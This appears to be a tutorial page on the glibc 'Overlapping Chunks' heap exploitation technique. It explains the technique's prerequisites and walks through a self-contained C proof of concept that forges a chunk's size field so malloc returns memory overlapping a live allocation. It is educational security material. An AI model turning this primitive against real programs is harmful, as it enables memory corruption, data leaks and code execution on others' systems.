#import "../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "Overlapping Chunks",
    description: "Abusing a size field overwrite to trick the allocator into returning a chunk that overlaps with another active allocation.",
    date: "2025-12-26",
    order: 28,
  ),
)<frontmatter>

= glibc Allocator: Overlapping Chunks

== Introduction

The "Overlapping Chunks" technique is a heap exploitation method where an attacker overwrites the `size` field of a chunk (either allocated or freed) to make it appear larger than it actually is. When this "evil" chunk is subsequently handled by the allocator (e.g., via `free()` and then `malloc()`), the allocator treats it as a large contiguous block that may encompass other, already-allocated chunks.

The result is that two or more pointers now point to overlapping regions of memory. This primitive allows an attacker to:
1. *Leak sensitive data*: Read the contents of the overlapped chunk (e.g., pointers, keys).
2. *Corrupt data*: Overwrite critical data in the overlapped chunk (e.g., function pointers, object metadata).

== Prerequisites
- *Heap Overflow*: Ability to overwrite the `size` field of a chunk (freed or allocated).
- *Size Calculation*: The new "evil" size must align with a valid chunk boundary (specifically, the next chunk's header must be valid enough to pass free list or allocation checks).
- *Allocation Control*: Ability to trigger an allocation (or free) of a size that matches the crafted chunk.

== Example from `overlapping_chunks.c`

This PoC demonstrates how to overlap two chunks by overwriting the size of a freed chunk to include the memory of a subsequent allocation.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

int main(int argc , char* argv[])
{
	setbuf(stdout, NULL);

	long *p1,*p2,*p3,*p4;
	printf("\nThis is another simple chunks overlapping problem\n");
	printf("The previous technique is killed by patch: https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c\n"
		   "which ensures the next chunk of an unsortedbin must have prev_inuse bit unset\n"
		   "and the prev_size of it must match the unsortedbin's size\n"
		   "This new poc uses the same primitive as the previous one. Theoretically speaking, they are the same powerful.\n\n");

	printf("Let's start to allocate 4 chunks on the heap\n");

	// Allocate chunks
	p1 = malloc(0x80 - 8);
	p2 = malloc(0x500 - 8);
	p3 = malloc(0x80 - 8);

	printf("The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n", p1, p2, p3);

	memset(p1, '1', 0x80 - 8);
	memset(p2, '2', 0x500 - 8);
	memset(p3, '3', 0x80 - 8);

	printf("Now let's simulate an overflow that can overwrite the size of the\nchunk freed p2.\n");
	int evil_chunk_size = 0x581; // 0x500 (p2) + 0x80 (p3) + 1 (PREV_INUSE)
	int evil_region_size = 0x580 - 8;
	printf("We are going to set the size of chunk p2 to %d, which gives us\na region size of %d\n",
		 evil_chunk_size, evil_region_size);

	/* VULNERABILITY: Overwrite the size field of chunk p2 */
	*(p2-1) = evil_chunk_size;

	printf("\nNow let's free the chunk p2\n");
	free(p2);
	printf("The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n");

	printf("\nNow let's allocate another chunk with a size equal to the data\n"
	       "size of the chunk p2 injected size\n");

	// This malloc will return the memory starting at p2, but extending through p3
	p4 = malloc(evil_region_size);

	printf("\np4 has been allocated at %p and ends at %p\n", (char *)p4, (char *)p4+evil_region_size);
	printf("p3 starts at %p and ends at %p\n", (char *)p3, (char *)p3+0x80-8);
	printf("p4 should overlap with p3, in this case p4 includes all p3.\n");

	// Demonstrate the overlap
	printf("\nIf we memset(p4, '4', %d), we have:\n", evil_region_size);
	memset(p4, '4', evil_region_size);
	printf("p4 = %s\n", (char *)p4);
	printf("p3 = %s\n", (char *)p3);

	printf("\nAnd if we then memset(p3, '3', 80), we have:\n");
	memset(p3, '3', 80);
	printf("p4 = %s\n", (char *)p4);
	printf("p3 = %s\n", (char *)p3);

	assert(strstr((char *)p4, (char *)p3));
}
```

== Attack Flow Explained

=== 1. Heap Preparation

We start by allocating three chunks: `p1`, `p2`, and `p3`.
- `p1`: 0x80 bytes (Small enough for fastbin/tcache, but here used for alignment).
- `p2`: 0x500 bytes (Large enough to be handled by the Unsorted Bin when freed).
- `p3`: 0x80 bytes (The target chunk that will be overlapped).

#figure(
  table(
    columns: (auto, auto, auto),
    inset: 10pt,
    align: center,
    [*Chunk*], [*Real Size*], [*Status*],
    [`p1`], `0x80`, [Allocated],
    [`p2`], `0x500`, [Allocated],
    [`p3`], `0x80`, [Allocated],
  ),
  caption: [Initial heap layout.],
)

=== 2. The Vulnerability: Size Overwrite

We simulate a heap overflow from `p1` or a direct write that modifies the metadata of `p2`. We change `p2`'s size from `0x501` to `0x581`.

- `0x500`: The original size of `p2`.
- `0x80`: The size of `p3`.
- `+1`: The `PREV_INUSE` bit of the *original* `p2` (assuming `p1` is in use).

By setting the size to `0x581`, we tell the allocator that `p2` is actually `0x580` bytes long. Crucially, the allocator will now look for the *next* chunk boundary at `p2 + 0x580`.

=== 3. Freeing and Sorting

When `free(p2)` is called, the allocator looks at the `size` field (`0x581`). It sees a large chunk and places it into the *Unsorted Bin*.

For this to succeed in modern glibc, the "next" chunk (at `p2 + 0x580`) must have its `PREV_INUSE` bit set and its `prev_size` must match (if it's not in use). Since our "evil" size exactly reaches the end of `p3`, the allocator looks at the chunk *immediately following `p3`* to perform its sanity checks.

=== 4. Re-allocation and Overlap

We now request an allocation of `0x580` bytes. The allocator finds our "evil" chunk in the Unsorted Bin, which perfectly satisfies the request.

```c
p4 = malloc(0x580 - 8);
```

The pointer `p4` returned by `malloc` is the same as the original `p2`. However, because its size is now `0x580`, it extends all the way through the memory occupied by `p3`.

#figure(
  table(
    columns: (auto, auto, auto, auto),
    inset: 10pt,
    align: center,
    [*Variable*], [*Address*], [*Extent*], [*Note*],
    [`p3`], `BASE + 0x580`, `0x80 bytes`, [Original allocation],
    [`p4`], `BASE + 0x80`, `0x580 bytes`, [Overlaps `p3`!],
  ),
  caption: [Final state: `p4` completely encompasses `p3`.],
)

Now, any data written to `p4` beyond the first `0x500` bytes will overwrite the metadata and data of `p3`. Conversely, reading from `p4` allows an attacker to see the contents of `p3`.
